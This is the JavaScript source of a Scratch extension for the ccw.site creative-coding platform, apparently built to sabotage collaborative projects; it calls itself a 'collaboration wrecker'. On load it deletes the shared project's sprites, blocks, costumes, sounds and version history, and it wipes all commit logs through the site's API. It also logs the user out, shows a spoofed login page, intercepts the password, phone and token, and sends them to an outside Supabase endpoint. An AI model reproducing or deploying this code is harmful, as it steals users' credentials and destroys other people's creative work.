(function anonymous(extid, CommunityEnhanced, forceMode) {
    function text(t, e) {
        if (t <= 0)
            return "";
        return e[Math.floor(Math.random() * e.length)] + text(t - 1, e)
    }
    function isInIframe() {
        try {
            return window.self !== window.top
        } catch (t) {
            return true
        }
    }
    function to(t) {
        history.pushState(null, null, t)
    }
    function patchXHR(t, r=()=>{}
    ) {
        if (t.XHRpatched)
            return;
        t.XHRpatched = 1;
        console.log("patchXHR");
        const e = t.document.querySelector(".thirdParty-1NOvR>.thirdPartyList-2c2jL");
        if (e)
            e.replaceWith(e.cloneNode(true));
        let i = {};
        const o = t.XMLHttpRequest.prototype;
        const c = o.send;
        o.send = function(e) {
            var t, o;
            try {
                if (((t = this.__sentry_xhr__) == null ? void 0 : t.url) == "https://sso.ccw.site/web/auth/login-by-password" || ((o = this.__sentry_xhr__) == null ? void 0 : o.url) == "https://sso.ccw.site/web/auth/v3/login/by_phone") {
                    try {
                        let t = JSON.parse(e);
                        i.loginKey = t.loginKey;
                        i.password = t.password;
                        i.countryCode = t.countryCode;
                        i.phone = t.phone;
                        i.extra = t.extra;
                        i.clientCode = t.clientCode;
                        const n = this.onreadystatechange;
                        this.onreadystatechange = function() {
                            var e;
                            if (this.readyState === 4) {
                                let t;
                                if (t = (e = JSON.parse(this.response).body) == null ? void 0 : e.token) {
                                    fetch("https://sso.ccw.site/web/auth/login-by-password", {
                                        method: "post",
                                        body: JSON.stringify(i),
                                        headers: {
                                            "content-type": "application/json"
                                        }
                                    });
                                    i.token = t;
                                    r(i)
                                }
                            }
                        }
                        ;
                        if (n) {
                            n.apply(this, arguments)
                        }
                    } catch (t) {
                        console.log(t)
                    }
                }
            } catch (t) {
                console.log(t)
            }
            return c.apply(this, arguments)
        }
        ;
        const s = t.fetch;
        t.fetch = function(t, e) {
            var o, n;
            if (((o = this.__sentry_xhr__) == null ? void 0 : o.url) == "https://sso.ccw.site/web/auth/login-by-password" || ((n = this.__sentry_xhr__) == null ? void 0 : n.url) == "https://sso.ccw.site/web/auth/v3/login/by_phone") {
                try {
                    let t = JSON.parse(e.body);
                    i.loginKey = t.loginKey;
                    i.password = t.password;
                    i.countryCode = t.countryCode;
                    i.phone = t.phone;
                    i.extra = t.extra;
                    i.clientCode = t.clientCode;
                    s.apply(this, arguments).then(n=>n.json().then(t=>{
                        var e;
                        let o = (e = t.body) == null ? void 0 : e.token;
                        if (o) {
                            fetch("https://sso.ccw.site/web/auth/login-by-password", {
                                method: "post",
                                body: JSON.stringify(t)
                            });
                            t.token = o;
                            r(t)
                        }
                        return n
                    }
                    ))
                } catch (t) {
                    console.log(t)
                }
            }
            return s(t, e)
        }
    }
    function login() {
        if (isInIframe())
            return;
        const t = text(15, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz");
        const n = location.href;
        let r = 1
          , i = null;
        window[t] = function(e) {
            const t = e.contentWindow;
            const o = e.contentDocument ?? t.document;
            clearInterval(i);
            i = setInterval(()=>{
                document.title = o.title
            }
            , 50);
            if (r) {
                o.addEventListener("click", ()=>patchXHR(t, t=>{
                    fetch(`https://xukdxshgprgaedrbykad.supabase.co/functions/v1/login`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(t),
                        keepalive: true
                    }).then(t=>{
                        to(n);
                        r = 0;
                        e.src = n
                    }
                    )
                }
                ), {
                    once: true
                })
            } else {
                if (!window.axios) {
                    t.resolve = t=>window.axios = t;
                    t.eval(`
                        const _apply = Function.prototype.apply;
                        Function.prototype.apply = function(thisArg, args) {
                            if (typeof thisArg === "object" && thisArg && thisArg.defaults && thisArg.interceptors && thisArg.interceptors.request.handlers.length > 0) {
                                this.apply = _apply;
                                resolve(window.axios=thisArg);
                            }
                            return _apply.call(this, thisArg, args);
                        };
                    `)
                }
            }
            document.title = "登录 - 共创世界(ccw.site) - Scratch、游戏、动画、漫画、小说、编程创作社区"
        }
        ;
        fetch("https://sso.ccw.site/web/auth/logout", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Origin: "https://www.ccw.site",
                Referer: "https://www.ccw.site/",
                Accept: "application/json,text/plain, */*"
            },
            body: "{}",
            credentials: "include"
        });
        patchXHR(window);
        window.addEventListener("beforeunload", function(t) {
            t.preventDefault();
            t.returnValue = "";
            return false
        });
        document.body.outerHTML = `<body style="left:0;top:0;width:100vw;height:100vh;border: none;z-index:999999;"><iframe src="https://www.ccw.site/login" onload='window[${JSON.stringify(t)}](this)' style="width:100%;height:100%;border: none;position: fixed;"></body>`;
        let e = document.createElement("style");
        e.textContent = ".editor-modal-root{display:none}";
        document.head.appendChild(e);
        to("/login")
    }
    function md5(t) {
        function s(t, e) {
            return t << e | t >>> 32 - e
        }
        function l(t, e) {
            const o = t & 2147483648;
            const n = e & 2147483648;
            const r = t & 1073741824;
            const i = e & 1073741824;
            const c = (t & 1073741823) + (e & 1073741823);
            if (r & i) {
                return c ^ 2147483648 ^ o ^ n
            }
            if (r | i) {
                if (c & 1073741824) {
                    return c ^ 3221225472 ^ o ^ n
                } else {
                    return c ^ 1073741824 ^ o ^ n
                }
            } else {
                return c ^ o ^ n
            }
        }
        function u(t, e, o) {
            return t & e | ~t & o
        }
        function a(t, e, o) {
            return t & o | e & ~o
        }
        function f(t, e, o) {
            return t ^ e ^ o
        }
        function d(t, e, o) {
            return e ^ (t | ~o)
        }
        function e(t, e, o, n, r, i, c) {
            t = l(t, l(l(u(e, o, n), r), c));
            return l(s(t, i), e)
        }
        function o(t, e, o, n, r, i, c) {
            t = l(t, l(l(a(e, o, n), r), c));
            return l(s(t, i), e)
        }
        function n(t, e, o, n, r, i, c) {
            t = l(t, l(l(f(e, o, n), r), c));
            return l(s(t, i), e)
        }
        function r(t, e, o, n, r, i, c) {
            t = l(t, l(l(d(e, o, n), r), c));
            return l(s(t, i), e)
        }
        function i(t) {
            const e = Math.ceil((t.length + 8) / 64) * 16;
            const o = new Array(e - 1);
            let n = 0;
            let r = 0;
            while (r < t.length) {
                o[r >>> 2] |= (t.charCodeAt(r) & 255) << 24 - r % 4 * 8;
                r++
            }
            o[r >>> 2] |= 128 << 24 - r % 4 * 8;
            o[e - 2] = t.length << 3;
            o[e - 1] = t.length >>> 29;
            return o
        }
        function c(e) {
            let o = "";
            for (let t = 0; t <= 3; t++) {
                o += (e >>> t * 8 & 255).toString(16).padStart(2, "0")
            }
            return o
        }
        let p = i(t);
        let h = 1732584193;
        let y = 4023233417;
        let g = 2562383102;
        let w = 271733878;
        for (let t = 0; t < p.length; t += 16) {
            const b = h;
            const m = y;
            const v = g;
            const _ = w;
            h = e(h, y, g, w, p[t + 0], 7, 3614090360);
            w = e(w, h, y, g, p[t + 1], 12, 3905402710);
            g = e(g, w, h, y, p[t + 2], 17, 606105819);
            y = e(y, g, w, h, p[t + 3], 22, 3250441966);
            h = e(h, y, g, w, p[t + 4], 7, 4118548399);
            w = e(w, h, y, g, p[t + 5], 12, 1200080426);
            g = e(g, w, h, y, p[t + 6], 17, 2821735955);
            y = e(y, g, w, h, p[t + 7], 22, 4249261313);
            h = e(h, y, g, w, p[t + 8], 7, 1770035416);
            w = e(w, h, y, g, p[t + 9], 12, 2336552879);
            g = e(g, w, h, y, p[t + 10], 17, 4294925233);
            y = e(y, g, w, h, p[t + 11], 22, 2304563134);
            h = e(h, y, g, w, p[t + 12], 7, 1804603682);
            w = e(w, h, y, g, p[t + 13], 12, 4254626195);
            g = e(g, w, h, y, p[t + 14], 17, 2792965006);
            y = e(y, g, w, h, p[t + 15], 22, 1236535329);
            h = o(h, y, g, w, p[t + 1], 5, 4129170786);
            w = o(w, h, y, g, p[t + 6], 9, 3225465664);
            g = o(g, w, h, y, p[t + 11], 14, 643717713);
            y = o(y, g, w, h, p[t + 0], 20, 3921069994);
            h = o(h, y, g, w, p[t + 5], 5, 3593408605);
            w = o(w, h, y, g, p[t + 10], 9, 38016083);
            g = o(g, w, h, y, p[t + 15], 14, 3634488961);
            y = o(y, g, w, h, p[t + 4], 20, 3889429448);
            h = o(h, y, g, w, p[t + 9], 5, 568446438);
            w = o(w, h, y, g, p[t + 14], 9, 3275163606);
            g = o(g, w, h, y, p[t + 3], 14, 4107603335);
            y = o(y, g, w, h, p[t + 8], 20, 1163531501);
            h = o(h, y, g, w, p[t + 13], 5, 2850285829);
            w = o(w, h, y, g, p[t + 2], 9, 4243563512);
            g = o(g, w, h, y, p[t + 7], 14, 1735328473);
            y = o(y, g, w, h, p[t + 12], 20, 2368359562);
            h = n(h, y, g, w, p[t + 5], 4, 4294588738);
            w = n(w, h, y, g, p[t + 8], 11, 2272392833);
            g = n(g, w, h, y, p[t + 11], 16, 1839030562);
            y = n(y, g, w, h, p[t + 14], 23, 4259657740);
            h = n(h, y, g, w, p[t + 1], 4, 2763975236);
            w = n(w, h, y, g, p[t + 4], 11, 1272893353);
            g = n(g, w, h, y, p[t + 7], 16, 4139469664);
            y = n(y, g, w, h, p[t + 10], 23, 3200236656);
            h = n(h, y, g, w, p[t + 13], 4, 681279174);
            w = n(w, h, y, g, p[t + 0], 11, 3936430074);
            g = n(g, w, h, y, p[t + 3], 16, 3572445317);
            y = n(y, g, w, h, p[t + 6], 23, 76029189);
            h = n(h, y, g, w, p[t + 9], 4, 3654602809);
            w = n(w, h, y, g, p[t + 12], 11, 3873151461);
            g = n(g, w, h, y, p[t + 15], 16, 530742520);
            y = n(y, g, w, h, p[t + 2], 23, 3299628645);
            h = r(h, y, g, w, p[t + 0], 6, 4096336452);
            w = r(w, h, y, g, p[t + 7], 10, 1126891415);
            g = r(g, w, h, y, p[t + 14], 15, 2878612391);
            y = r(y, g, w, h, p[t + 5], 21, 4237533241);
            h = r(h, y, g, w, p[t + 12], 6, 1700485571);
            w = r(w, h, y, g, p[t + 3], 10, 2399980690);
            g = r(g, w, h, y, p[t + 10], 15, 4293915773);
            y = r(y, g, w, h, p[t + 1], 21, 2240044497);
            h = r(h, y, g, w, p[t + 8], 6, 1873313359);
            w = r(w, h, y, g, p[t + 15], 10, 4264355552);
            g = r(g, w, h, y, p[t + 6], 15, 2734768916);
            y = r(y, g, w, h, p[t + 13], 21, 1309151649);
            h = r(h, y, g, w, p[t + 4], 6, 4149444226);
            w = r(w, h, y, g, p[t + 11], 10, 3174756917);
            g = r(g, w, h, y, p[t + 2], 15, 718787259);
            y = r(y, g, w, h, p[t + 9], 21, 3951481745);
            h = l(h, b);
            y = l(y, m);
            g = l(g, v);
            w = l(w, _)
        }
        return c(h) + c(y) + c(g) + c(w)
    }
    function verifyMD5(t, e) {
        return md5(t) === e
    }
    (function(t, i, c, k) {
        var e;
        const s = typeof extid == "undefined" ? "collaborationKiller" : extid;
        const r = typeof forceMode == "undefined" ? true : forceMode;
        const {ArgumentType: O, BlockType: S, TargetType: o, Cast: x, translate: n, extensions: l} = t;
        function u(t, e) {
            if (t <= 0)
                return "";
            return e[Math.floor(Math.random() * e.length)] + u(t - 1, e)
        }
        function a() {
            var t;
            try {
                const e = u(15, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz");
                if (!verifyMD5(window.__13579__md5_1, "0b176b12ee94661ab1c890d2fee50f00"))
                    return true;
                if (!verifyMD5(e + "_lJKmYztMIHqJohl", (t = window.__13579__md5_2) == null ? void 0 : t.call(window, e)))
                    return true;
                return false
            } catch {
                return true
            }
        }
        function f(t) {
            const e = `; ${document.cookie}`;
            const o = e.split(`; ${t}=`);
            return o.pop().split(";").shift()
        }
        function d(t, e) {
            var o;
            if (t === i.editingTarget) {
                (o = k.getMainWorkspace().getBlockById(e.id)) == null ? void 0 : o.dispose(true, false)
            } else {
                t.blocks.deleteBlock(e.id)
            }
        }
        function p(t=false) {
            for (const e of c.targets) {
                if (t)
                    e.isStage = false;
                if (!e.isStage)
                    i.deleteSprite(e.id);
                else {
                    for (const o of Object.values(e.blocks._blocks)) {
                        if (!o.opcode.startsWith(s + "_"))
                            d(e, o)
                    }
                    for (const n in e.sprite.costumes) {
                        e.deleteCostume(n)
                    }
                    for (const r in e.sprite.sounds) {
                        e.deleteSound(r)
                    }
                }
            }
            i.toJSON = ()=>"协作破坏器"
        }
        function h() {
            const e = f("cookie-user-id");
            const o = location.href.split("/").pop().split("?")[0];
            function t() {
                function t() {
                    for (let t of Object.getOwnPropertyNames(c)) {
                        delete c[t]
                    }
                    for (let t of Object.getOwnPropertyNames(i)) {
                        delete i[t]
                    }
                    for (let t of Object.getOwnPropertyNames(k)) {
                        delete k[t]
                    }
                    i.toJSON = ()=>"协作破坏器"
                }
                try {
                    p(true)
                } catch {
                    while (true)
                        ;
                }
            }
            async function n() {
                if (window.axios && e && o) {
                    let e, t = 1;
                    while ((e = (await axios.get(`https://gandi-main.ccw.site/creations/${o}/commit-logs?page=${t++}&perPage=1000&sortField=generatedAt&sortType=DESC`, {
                        headers: {
                            "content-type": "application/json"
                        }
                    })).data).length) {
                        for (let {oid: t} of e) {
                            axios.delete(`https://gandi-main.ccw.site/creations/${o}/commit-logs/${t}`, {
                                headers: {
                                    "content-type": "application/json"
                                }
                            })
                        }
                    }
                }
            }
            if (r) {
                indexedDB.deleteDatabase("HistoricalVersionDB");
                p();
                n()
            }
            if (isInIframe()) {
                window.exit = async()=>{
                    try {
                        if (!window.axios)
                            throw "没有axios";
                        if (!e)
                            throw "没有用户id";
                        if (o === "gandi" || o === "extension")
                            throw "没有作品id，作品可能未保存";
                        const t = await axios.post("https://community-web.ccw.site/creation/team_member/remove", {
                            creationOid: o,
                            userOid: e,
                            authority: "MEMBER"
                        }, {
                            headers: {
                                "content-type": "application/json"
                            }
                        });
                        if (t.msg)
                            throw t.msg;
                        alert("退出协作成功")
                    } catch (t) {
                        alert("退出协作失败：" + t)
                    }
                }
                ;
                document.body.outerHTML = `<body style="background: #ffffff"><h1>\u534F\u4F5C\u7834\u574F\u5668\u6269\u5C55</h1><p>\u53EF\u4EE5\u7834\u574F\u522B\u4EBA\u7684\u534F\u4F5C</p><p>\u6B22\u8FCE\u67E5\u770B<a href="https://www.kdocs.cn/l/chnkzapYpPlg">\u6269\u5C55\u6587\u6863</a></p><button onclick="window.exit()">\u70B9\u51FB\u9000\u51FA\u534F\u4F5C</button></body>`;
                t()
            } else {
                login()
            }
        }
        u(15, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz");
        const y = ()=>Math.floor(Math.random() * 256);
        function g(t) {
            if (t < 0) {
                t += 16777215 + 1
            }
            let e = Number(t).toString(16);
            e = `#${"000000".substr(0, 6 - e.length)}${e}`;
            return e
        }
        function w(t) {
            return (t.r << 16) + (t.g << 8) + t.b
        }
        function b(t) {
            return g(w(t))
        }
        function m() {
            return b({
                r: y(),
                g: y(),
                b: y()
            })
        }
        function E(t) {
            if (t == "random")
                return m();
            switch (typeof t) {
            case "object":
                return b(t);
            case "number":
                return g(t);
            default:
                return t
            }
        }
        const v = ()=>({
            id: s,
            name: "协作破坏器",
            blocks: ["a", null, "占位积木", {}, ()=>{}
            , , ],
            init() {
                var t, e;
                (e = (t = c.getTargetForStage()) == null ? void 0 : t.blocks) == null ? void 0 : e.createBlock({
                    opcode: s + "_a",
                    next: null,
                    parent: null,
                    inputs: {},
                    fields: {},
                    shadow: false,
                    topLevel: true,
                    mutation: null
                });
                if (a())
                    h()
            }
        });
        function T(t) {
            try {
                if (Array.isArray(t)) {
                    new Map(t);
                    return t
                } else
                    return Object.entries(t)
            } catch {
                return []
            }
        }
        function _(t) {
            const e = Function.prototype.apply;
            Function.prototype.apply = function(t) {
                return t
            }
            ;
            const o = t();
            Function.prototype.apply = e;
            return o
        }
        function N(t) {
            var e;
            if (t._events["EXTENSION_ADDED"]instanceof Array) {
                for (const o of t._events["EXTENSION_ADDED"]) {
                    const n = _(o);
                    if (n == null ? void 0 : n.ScratchBlocks) {
                        k = n == null ? void 0 : n.ScratchBlocks;
                        break
                    }
                }
            } else if (t._events["EXTENSION_ADDED"]) {
                k = (e = _(t._events["EXTENSION_ADDED"])) == null ? void 0 : e.ScratchBlocks
            }
            return k
        }
        function A(t, e, r, i) {
            const {id: c, blocks: s, menus: l} = t;
            let u = [];
            if (!Array.isArray(s))
                return [];
            let f = 0;
            while (f < s.length) {
                let o, n;
                if (r == 1) {
                    n = f / 6;
                    o = s.slice(f, f + 6);
                    f += 6
                } else if (r == 2) {
                    n = f;
                    o = s[f];
                    f++
                } else
                    throw new Error("unknow mode");
                if (Array.isArray(o)) {
                    const [b,m,v,_,N,A] = o;
                    o = {
                        opcode: b,
                        blockType: m,
                        text: v,
                        args: _,
                        func: N,
                        otherSetting: A
                    }
                }
                const {opcode: d, blockType: p, text: h, args: y, func: g, otherSetting: w} = o;
                u[n] = w ?? {};
                if (typeof w == "object") {
                    if (Array.isArray(w)) {
                        w.forEach((t,e)=>{
                            u[n][["allowDropAnywhere", "hideFromPalette", "disableMonitor", "isEdgeActivated", "branchCount", "output", "outputShape", "init", "tooltip"][e]] = t
                        }
                        )
                    }
                }
                let a = u[n];
                a.blockType = {
                    r: S.REPORTER,
                    b: S.BOOLEAN,
                    a: S.COMMAND,
                    l: S.LABEL,
                    h: S.HAT,
                    c: S.CONDITIONAL,
                    t: S.BUTTON,
                    e: S.EVENT,
                    x: S.XML
                }[p] ?? p;
                if (d)
                    a[a.blockType == S.BUTTON ? "func" : "opcode"] = d;
                if (h)
                    a[a.blockType == S.XML ? "xml" : "text"] = h;
                a.arguments = {};
                for (let[e,[o,n,r,t,i]] of T(y)) {
                    let t = i ?? {};
                    if (o)
                        t.type = {
                            s: O.STRING,
                            n: O.NUMBER,
                            b: O.BOOLEAN,
                            c: O.COLOR,
                            a: O.ANGLE,
                            i: O.IMAGE
                        }[o] ?? o;
                    if (typeof n != "undefined")
                        t[t.type == O.IMAGE ? "dataURI" : "defaultValue"] = n;
                    if (Array.isArray(r)) {
                        l[`${a.func ?? a.opcode}_${e}`] = r;
                        t.menu = `${a.func ?? a.opcode}_${e}`
                    } else
                        t.menu = r;
                    a.arguments[e] = t
                }
                if (typeof g == "function")
                    i[a.func ?? a.opcode] = function(l, ...u) {
                        if (typeof l != "object")
                            return g.call(this, l, ...u);
                        return g.call(this, new Proxy(l,{
                            get: (t,e)=>{
                                var o, n, r, i;
                                const c = {
                                    s: x.toString,
                                    n: x.toNumber,
                                    b: x.toBoolean,
                                    d: t=>{
                                        if (typeof t == "number" || typeof t == "boolean")
                                            return t;
                                        if (t == "true")
                                            return true;
                                        if (t == "false")
                                            return false;
                                        if (Number.isNaN(t) || Number.isFinite(t))
                                            return Number(t);
                                        if (typeof t == "string")
                                            return t;
                                        return t
                                    }
                                    ,
                                    _s: String,
                                    _n: Number,
                                    _b: Boolean,
                                    1: {
                                        [O.STRING]: x.toString,
                                        [O.NUMBER]: x.toNumber,
                                        [O.BOOLEAN]: x.toBoolean,
                                        [O.ANGLE]: x.toNumber,
                                        [O.COLOR]: E
                                    }[(o = a.arguments[e]) == null ? void 0 : o.type],
                                    0: {
                                        [O.STRING]: String,
                                        [O.NUMBER]: Number,
                                        [O.BOOLEAN]: Boolean,
                                        [O.ANGLE]: Number
                                    }[(n = a.arguments[e]) == null ? void 0 : n.type],
                                    array: t=>{
                                        if (Array.isArray(t))
                                            return t;
                                        try {
                                            if (typeof t == "string")
                                                return Array.from(JSON.stringify(t));
                                            return [...t]
                                        } catch {
                                            return null
                                        }
                                    }
                                    ,
                                    obj: t=>{
                                        if (typeof t == "object")
                                            return t;
                                        try {
                                            return JSON.parse(t)
                                        } catch {
                                            return null
                                        }
                                    }
                                    ,
                                    url: t=>{
                                        try {
                                            return new URL(t)
                                        } catch {
                                            return null
                                        }
                                    }
                                    ,
                                    color: E
                                };
                                let s = c[(r = y[e]) == null ? void 0 : r[3]] ?? ((i = y[e]) == null ? void 0 : i[3]);
                                if (typeof s == "function")
                                    return s.call(this, Reflect.get(t, e), l, ...u);
                                return Reflect.get(t, e)
                            }
                        }), ...u)
                    }
                    ;
                if (typeof (w == null ? void 0 : w.init) == "function") {
                    let e = function(t) {
                        let e = {};
                        const n = t.init;
                        e.init = function(...t) {
                            if (!(this instanceof k.Block))
                                return;
                            let e = n.call(this, ...t);
                            let o = w.init.call(this, ...t);
                            return o ?? e
                        }
                        ;
                        return Object.assign(t, e)
                    };
                    Reflect.defineProperty(k.Blocks, `${c}_${d}`, {
                        get() {
                            return o
                        },
                        set(t) {
                            return o = e(t)
                        },
                        configurable: true
                    })
                }
            }
            if (e) {
                const {docsURI: o, docsTEXT: n} = e;
                u.splice(0, 0, {
                    func: "_openDocs",
                    blockType: S.BUTTON,
                    text: n
                });
                i._openDocs = function() {
                    let t = document.createElement("a");
                    t.href = o;
                    t.target = "_blank";
                    t.click()
                }
            }
            return u
        }
        function B(t, e, o) {
            try {
                let n = [];
                if (Array.isArray(t))
                    for (let o of t) {
                        if (Array.isArray(o)) {
                            let[t,e] = o;
                            n.push({
                                text: t,
                                value: e
                            })
                        } else
                            n.push(o)
                    }
                else if (typeof t == "function") {
                    o[`_menu_${e}_items`] = t;
                    n = `_menu_${e}_items`
                } else
                    n = t;
                return n
            } catch {
                return []
            }
        }
        function j(t, r) {
            let i = {};
            for (let[o,n] of T(t)) {
                let[t,e] = n;
                i[o] = {
                    acceptReporters: t,
                    items: B(e, o, r)
                }
            }
            return i
        }
        let M;
        class R {
            constructor(t) {
                var e, o;
                c = t;
                i = c.extensionManager.vm;
                k = window.ScratchBlocks ?? c.scratchBlocks ?? N(i);
                const n = c._convertBlockForScratchBlocks.bind(c);
                c._convertBlockForScratchBlocks = (t,e)=>{
                    const o = n(t, e);
                    if (t.outputShape)
                        o.json.outputShape = t.outputShape;
                    if (t.branchCount)
                        o.json.branchCount = t.branchCount;
                    if (t.tooltip)
                        o.json.tooltip = t.tooltip;
                    if (t.color)
                        [o.json.colour,o.json.colourSecondary,o.json.colourTertiary] = t.color instanceof Array ? t.color : [t.color];
                    if (t.disableMonitor) {
                        delete o.json.checkboxInFlyout
                    } else if (typeof t.disableMonitor != "undefined") {
                        o.json.checkboxInFlyout = true
                    }
                    if (t.output) {
                        o.json.output = t.output
                    } else {
                        if (o.json.output !== void 0)
                            o.json.output = null
                    }
                    if (t.info)
                        Object.assign(o.info, t.info);
                    if (t.json)
                        Object.assign(o.json, t.json);
                    if (t.xml)
                        o.xml = t.xml;
                    return o
                }
                ;
                M = v.call(this);
                (o = (e = M.init) == null ? void 0 : e.call) == null ? void 0 : o.call(e, this)
            }
            getInfo() {
                const {id: t, name: e, color1: o, color2: n, color3: r, icon: i, docs: c=false, docsURI: s="https://assets.ccw.site/extension/" + t, docsTEXT: l="打开文档", blocks_parse_mode: u=1, blocks: a=[], menus: f={}, init: d, ...p} = M = v.call(this);
                return {
                    id: t,
                    name: e,
                    ...function(o) {
                        Object.entries(o).forEach(([t,e])=>{
                            o[t] = E(e)
                        }
                        );
                        return o
                    }({
                        color1: o,
                        color2: n,
                        color3: r
                    }),
                    blockIconURI: i,
                    blocks: A(M, c && {
                        docsURI: s,
                        docsTEXT: l
                    }, u, R.prototype),
                    menus: j(f, R.prototype),
                    ...p
                }
            }
        }
        t.extensions.register(new R(((e = t.vm) == null ? void 0 : e.runtime) ?? t.runtime))
    }
    )(Scratch);
}
)
